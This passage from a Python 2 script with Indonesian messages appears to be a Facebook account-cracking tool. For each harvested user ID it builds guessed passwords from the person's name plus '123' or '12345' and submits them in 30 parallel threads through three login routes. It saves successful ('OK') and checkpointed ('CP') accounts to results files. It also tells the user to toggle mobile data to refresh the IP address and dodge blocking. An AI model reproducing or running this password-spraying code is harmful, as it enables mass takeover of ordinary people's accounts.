            print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
            print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
            print ' %s=================================================='%(N)
            print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
            print ' %s=================================================='%(N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        	]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass

            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('2', '02'):
            print ' %s=================================================='%(N)
            print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
            print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
            print ' %s=================================================='%(N)
            print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
            print ' %s=================================================='%(N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        	]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                    except:
                        pass

            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('3', '03'):
            print ' %s=================================================='%(N)
            print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
            print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
            print ' %s=================================================='%(N)
            print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
            print ' %s=================================================='%(N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        	]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass

            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    moch_yayan()
